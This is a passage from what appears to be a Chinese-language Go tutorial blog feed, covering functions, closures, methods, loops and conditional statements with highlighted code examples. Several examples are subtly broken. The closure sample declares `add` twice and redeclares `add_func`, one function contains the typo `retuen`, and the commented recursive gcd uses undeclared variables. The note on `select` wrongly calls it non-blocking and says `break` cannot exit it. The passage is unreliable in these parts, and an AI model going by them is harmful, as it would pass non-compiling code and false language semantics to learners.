class="hljs-type">int</span>)</span></span> &#123;<br>      temp := x    <span class="hljs-comment">/* 保存 x 的值 */</span><br>      x = y      <span class="hljs-comment">/* 将 y 值赋给 x */</span><br>      y = temp    <span class="hljs-comment">/* 将 temp 值赋给 y */</span><br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(x *<span class="hljs-type">int</span>, y *<span class="hljs-type">int</span>)</span></span> &#123;<br>      <span class="hljs-keyword">var</span> temp <span class="hljs-type">int</span><br>      temp = *x    <span class="hljs-comment">/* 保存 x 地址上的值 */</span><br>      *x = *y      <span class="hljs-comment">/* 将 y 值赋给 x */</span><br>      *y = temp    <span class="hljs-comment">/* 将 temp 值赋给 y */</span><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数用法"><a href="#函数用法" class="headerlink" title="函数用法"></a>函数用法</h2><h3 id="作为实参"><a href="#作为实参" class="headerlink" title="作为实参"></a>作为实参</h3><p><code>Go</code>语言可以很灵活的创建函数，并作为另外一个函数的实参。</p><p><strong>实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main <br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span> <br><br><span class="hljs-comment">// 声明一个函数类型 </span><br><span class="hljs-keyword">type</span> cb <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123; <br>   testCallBack(<span class="hljs-number">1</span>, callBack)<span class="hljs-comment">//执行函数---testCallBack </span><br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testCallBack</span><span class="hljs-params">(x <span class="hljs-type">int</span>, f cb)</span></span> &#123;  <span class="hljs-comment">//定义了一个函数 testCallBack</span><br>    f(x)  <span class="hljs-comment">//由于传进来的是callBack函数，该函数执行需要传入一个int类型参数，因此传入x </span><br>&#125; <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">callBack</span><span class="hljs-params">(x <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123; <br>   fmt.Printf(<span class="hljs-string">&quot;我是回调，x：%d\n&quot;</span>, x) <br>   <span class="hljs-keyword">return</span> x <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>闭包是匿名函数，可在动态编程中使用</p><p>匿名函数是一个”内联”语句或表达式。</p><p>匿名函数的优越性：可以直接使用函数内的变量，不必申明。</p><p><strong>实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// 闭包使用方法</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(x1, x2 <span class="hljs-type">int</span>)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)  &#123;<br>   i := <span class="hljs-number">0</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>)&#123;<br>      i++<br>      <span class="hljs-keyword">return</span> i,x1+x2<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">// 闭包带参数，闭包函数可不用写形参名称</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(x1, x2 <span class="hljs-type">int</span>)</span></span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x3 <span class="hljs-type">int</span>,x4 <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>   i := <span class="hljs-number">0</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(x3 <span class="hljs-type">int</span>, x4 <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123; <br>      i++<br>      <span class="hljs-keyword">return</span> i,x1 + x2,x3 + x4<br>   &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>   add_func := add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">//作为一个加法函数，函数i为0</span><br>   fmt.Println(add_func())<br>   fmt.Println(add_func())<br>   fmt.Println(add_func())<br><br>   add_func1 := add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>) <span class="hljs-comment">//创建新的函数，add()方法被重新赋值</span><br>   fmt.Println(add_func1()) <span class="hljs-comment">//i是1</span><br>   fmt.Println(add_func()) <span class="hljs-comment">//尽管外面的函数销毁了，但是内部函数仍然存在，这个就是闭包</span><br>   fmt.Println(add_func1()) <span class="hljs-comment">//i是2</span><br><br>   add_func := add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>   fmt.Println(add_func(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<br>   fmt.Println(add_func(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>   fmt.Println(add_func(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>))<br>&#125;<br><br>运行结果：<br><span class="hljs-number">1</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span><br><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span><br><span class="hljs-number">4</span> <span class="hljs-number">3</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span><br><span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">var</span> Res = <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>   retuen a - b<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-comment">// 匿名函数：只调用一次，定义时直接调用</span><br>   res1 := <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>      <span class="hljs-keyword">return</span> a + b<br>   &#125;(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>   fmt.Printf(<span class="hljs-string">&quot;res1 = %d\n&quot;</span>, res1)<br><br>   <span class="hljs-comment">// 匿名函数：赋予其他变量调用，可多次使用，但作用域有限</span><br>   res2 := <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>      <span class="hljs-keyword">return</span> a * b<br>   &#125;<br>   res3 := res2(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>   fmt.Printf(<span class="hljs-string">&quot;res3 = %d\n&quot;</span>, res3)<br><br>   <span class="hljs-comment">// 匿名函数做全局变量，则该函数为全局匿名函数</span><br>   res4 := Res(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>   fmt.Printf(<span class="hljs-string">&quot;res4 = %d\n&quot;</span>, res4)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>一个方法就是一个包含了接受者的函数，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。</p><p>所有给定类型的方法属于该类型的方法集。</p><p>关于值和指针，如果想在方法中改变结构体类型的属性，需要对方法传递指针，体会如下对结构体类型改变的方法 changRadis() 和普通的函数 change() 中的指针操作:</p><p><strong>实例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">&quot;fmt&quot;</span>  <br>)<br><br><span class="hljs-comment">/* 定义结构体 */</span><br><span class="hljs-keyword">type</span> Circle <span class="hljs-keyword">struct</span> &#123;<br>   radius <span class="hljs-type">float64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c Circle)</span></span> getArea() <span class="hljs-type">float64</span>  &#123;<br>   <span class="hljs-keyword">return</span> c.radius * c.radius * <span class="hljs-number">3.14</span><br>&#125;<br><br><span class="hljs-comment">// 注意如果想要更改成功c的值，这里需要传指针</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Circle)</span></span> changeRadius(radius <span class="hljs-type">float64</span>)  &#123;<br>   c.radius = radius<br>&#125;<br>   <br><span class="hljs-comment">// 以下操作将不生效</span><br><span class="hljs-comment">// func (c Circle) changeRadius(radius float64)  &#123;</span><br><span class="hljs-comment">//   c.radius = radius</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// 引用类型要想改变值需要传指针</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">change</span><span class="hljs-params">(c *Circle, radius <span class="hljs-type">float64</span>)</span></span>  &#123;<br>   c.radius = radius<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>  &#123; <br>   <span class="hljs-keyword">var</span> c Circle<br>   fmt.Println(c.radius) <span class="hljs-comment">// 0</span><br>   c.radius = <span class="hljs-number">10.00</span><br>   fmt.Println(c.getArea()) <span class="hljs-comment">// 314</span><br>   c.changeRadius(<span class="hljs-number">20</span>)<br>   fmt.Println(c.radius) <span class="hljs-comment">// 20</span><br>   change(&amp;c, <span class="hljs-number">30</span>)<br>   fmt.Println(c.radius) <span class="hljs-comment">// 30</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数实例"><a href="#函数实例" class="headerlink" title="函数实例"></a>函数实例</h2><p>返回m,n的最大公因数，最小公倍数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">// 循环</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">gcd</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>   <span class="hljs-keyword">for</span> b != <span class="hljs-number">0</span> &#123;<br>        a, b = b, a%b<br>   &#125;<br>   <span class="hljs-keyword">return</span> a<br>&#125;<br><br><span class="hljs-comment">//递归</span><br><span class="hljs-comment">/* func gcd(a int, b int) int &#123;</span><br><span class="hljs-comment">    if a &gt; b &#123;</span><br><span class="hljs-comment">       val = b</span><br><span class="hljs-comment">tem = a</span><br><span class="hljs-comment">&#125; else &#123;</span><br><span class="hljs-comment">      val = a</span><br><span class="hljs-comment">tem = b</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">if tem%val != 0 &#123;</span><br><span class="hljs-comment">      val = gcd(val, tem-val)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">return val</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">lcm</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>   <span class="hljs-keyword">return</span> a * b / gcd(a, b)<br>   &#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>Go</code>语言标准库提供了多种可动用的内置的函数。例如，len() 函数可以接受不同类型参数并返回该类型的长度。如果我们传入的是字符串则返回字符串的长度；如果传入的是数组，则返回数组中包含的元素个数。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;p&gt;函数是基本的代码块，用于执行一个任务。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Go&lt;/code&gt;语言最少有个&lt;code&gt;main()&lt;/code&gt;函数。</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>循环语句</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-loopStatement/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-loopStatement/</id>
    <published>2023-05-27T02:56:22.000Z</published>
    <updated>2023-07-27T02:35:20.771Z</updated>
    
    <content type="html"><![CDATA[<h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p><code>for</code>循环是一个循环控制结构，可以执行指定次数的循环。</p><p><code>Go</code>语言的<code>For</code>循环有3种形式，只有其中的一种使用分号。</p><h3 id="与C一样"><a href="#与C一样" class="headerlink" title="与C一样"></a>与C一样</h3><p><code>for init; condition; post &#123; &#125;</code>  </p><ol><li>先对表达式<code>1</code>赋初值；</li><li>判别赋值表达式<code>init</code>是否满足给定条件，若满足循环条件，则执行循环体内语句，然后执行<code>post</code>，进入第二次循环，再判别<code>condition</code>；否则不满足条件，就终止for循环，执行循环体外语句。</li></ol><h3 id="与C的while一样"><a href="#与C的while一样" class="headerlink" title="与C的while一样"></a>与C的while一样</h3><p><code>for condition &#123; &#125;</code></p><h3 id="与C的for-一样"><a href="#与C的for-一样" class="headerlink" title="与C的for(;;)一样"></a>与C的for(;;)一样</h3><p><code>for &#123; &#125;</code></p><h3 id="for-range"><a href="#for-range" class="headerlink" title="for range"></a>for range</h3><p><code>for</code>循环的<code>range</code>格式可以对<code>slice、map、数组、字符串</code>等进行迭代循环。格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> oldMap &#123;<br>    newMap[key] = value<br>&#125;<br></code></pre></td></tr></table></figure><p>如果只想读取 key，格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> oldMap<br></code></pre></td></tr></table></figure><p>或者这样：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> key, _ := <span class="hljs-keyword">range</span> oldMap<br></code></pre></td></tr></table></figure><p>如果只想读取 value，格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, value := <span class="hljs-keyword">range</span> oldMap  <span class="hljs-comment">//必须使用_来占位</span><br></code></pre></td></tr></table></figure><h2 id="循环嵌套"><a href="#循环嵌套" class="headerlink" title="循环嵌套"></a>循环嵌套</h2><p>在循环内使用循环。</p><p>以下为 Go 语言嵌套循环的格式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> [condition |  ( init; condition; increment ) | Range]<br>&#123;<br>   <span class="hljs-keyword">for</span> [condition |  ( init; condition; increment ) | Range]<br>   &#123;<br>      statement(s);<br>   &#125;<br>   statement(s);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>输出100内的所有素数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> i, j <span class="hljs-type">int</span><br><br>   <span class="hljs-keyword">for</span> i=<span class="hljs-number">2</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>      <span class="hljs-keyword">for</span> j=<span class="hljs-number">2</span>; j &lt;= (i/j); j++ &#123;<br>         <span class="hljs-keyword">if</span>(i%j==<span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 如果发现因子，则不是素数</span><br>         &#125;<br>      &#125;<br>      <span class="hljs-keyword">if</span>(j &gt; (i/j)) &#123;<br>         fmt.Printf(<span class="hljs-string">&quot;%d  是素数\n&quot;</span>, i);<br>      &#125;<br>   &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h2><p>如果循环中条件语句永远不为<code>false</code>则会进行无限循环，我们可以通过<code>for</code>循环语句中只设置一个条件表达式来执行无限循环</p><h2 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h2><h3 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a>break语句</h3><p><code>Go</code>语言中<code>break</code>语句用于以下两方面：</p><ul><li>用于循环语句中跳出循环，并开始执行循环之后的语句。</li><li><code>break</code>在<code>switch</code>（开关语句）中在执行一条<code>case</code>后跳出语句的作用。</li><li>在多重循环中，可以用标号<code>label</code>标出想<code>break</code>的循环。</li></ul><blockquote><p>在<code>Go</code>语言中，<code>break</code>语句在<code>select</code>语句中的应用是相对特殊的。由于<code>select</code>语句的特性，<code>break</code>语句并不能直接用于跳出<code>select</code>语句本身，因为 <code>select</code> 语句是非阻塞的，它会一直等待所有的通信操作都准备就绪。如果需要提前结束 <code>select</code> 语句的执行，可以使用<code>return</code>或者<code>goto</code>语句来达到相同的效果。</p></blockquote><h3 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a>continue语句</h3><p>跳过当前循环的剩余语句，然后继续进行下一轮循环。</p><ul><li><code>for</code>循环中，执行<code>continue</code>语句会触发<code>for</code>增量语句的执行。</li><li>在多重循环中，可以用标号<code>label</code>标出想<code>continue</code>的循环。</li></ul><h3 id="goto语句"><a href="#goto语句" class="headerlink" title="goto语句"></a>goto语句</h3><p><code>Go </code>语言的<code>goto</code>语句可以无条件地转移到过程中指定的行。</p><p><code>goto </code>语句通常与条件语句配合使用。可用来实现条件转移， 构成循环，跳出循环体等功能。</p><p>但是，在结构化程序设计中一般不主张使用<code>goto</code>语句， 以免造成程序流程的混乱，使理解和调试程序都产生困难。</p><h4 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">goto</span> label;<br>..<br>.<br>label: statement;<br></code></pre></td></tr></table></figure><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">10</span><br><br>   <span class="hljs-comment">/* 循环 */</span><br>   LOOP: <span class="hljs-keyword">for</span> a &lt; <span class="hljs-number">20</span> &#123;<br>      <span class="hljs-keyword">if</span> a == <span class="hljs-number">15</span> &#123;<br>         <span class="hljs-comment">/* 跳过迭代 */</span><br>         a = a + <span class="hljs-number">1</span><br>         <span class="hljs-keyword">goto</span> LOOP<br>      &#125;<br>      fmt.Printf(<span class="hljs-string">&quot;a的值为 : %d\n&quot;</span>, a)<br>      a++    <br>   &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;循环语句&quot;&gt;&lt;a href=&quot;#循环语句&quot; class=&quot;headerlink&quot; title=&quot;循环语句&quot;&gt;&lt;/a&gt;循环语句&lt;/h1&gt;&lt;h2 id=&quot;for循环&quot;&gt;&lt;a href=&quot;#for循环&quot; class=&quot;headerlink&quot; title=&quot;for循环&quot;&gt;</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>条件语句</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-conditionalStatement/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-conditionalStatement/</id>
    <published>2023-05-27T02:26:22.000Z</published>
    <updated>2024-04-16T12:00:32.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><blockquote><p><code>Go</code>没有三目运算符，所以不支持 ?: 形式的条件判断。</p></blockquote><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p>由一个布尔表达式后紧跟一个或多个语句组成。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> [statement] ; <span class="hljs-type">bool</span> &#123;<br>    <span class="hljs-comment">//</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>Go的if语句可以在条件判断语句里声明变量，用<code>;</code>分隔多个变量，这个变量的作用域只在当前条件逻辑块内<br>条件不需要用括号<br>左括号<code>&#123;</code>必须在if或else同一行</p></blockquote><h2 id="if…else语句"><a href="#if…else语句" class="headerlink" title="if…else语句"></a>if…else语句</h2><p><code>if </code>语句后可以使用可选的<code>else</code>语句,<code>else</code>语句中的表达式在布尔表达式为<code>false</code>时执行。</p><h2 id="if嵌套语句"><a href="#if嵌套语句" class="headerlink" title="if嵌套语句"></a>if嵌套语句</h2><p>你可以在<code>if</code>或<code>else if</code>语句中嵌入一个或多个<code>if</code>或<code>else if</code>语句。</p><h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p>用于基于不同条件执行不同动作。每一个<code>case</code>分支都是唯一的，<strong>从上至下</strong>逐一测试，直到匹配为止。</p><p><code>switch</code>默认情况下<code>case</code>最后自带<code>break</code>语句，匹配成功后就不会执行其他<code>case</code>；如果我们需要执行后面的<code>case</code>，可以使用<code>fallthrough</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> var1 &#123;<br>    <span class="hljs-keyword">case</span> val1:    <span class="hljs-comment">//必须是同类型的任意值</span><br>        ...<br>    <span class="hljs-keyword">case</span> val2, val3, val4:    <span class="hljs-comment">//可以同时测试多个值，使用逗号分割</span><br>        ...<br>    <span class="hljs-keyword">default</span>:<br>        ...<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>fallthrough</code><br>使用<code>fallthrough</code>会强制执行后面的<code>case</code>语句，<code>fallthrough</code><strong>不会判断</strong>下一条<code>case</code>的表达式结果是否为<code>true</code>。（默认执行）</p></blockquote><h3 id="Type-Switch"><a href="#Type-Switch" class="headerlink" title="Type Switch"></a>Type Switch</h3><p>能够判断某个interface变量中实际存储的变量类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> x.(<span class="hljs-keyword">type</span>)&#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-keyword">type</span>:<br>       statement(s);<br>    <span class="hljs-keyword">default</span>: <br>       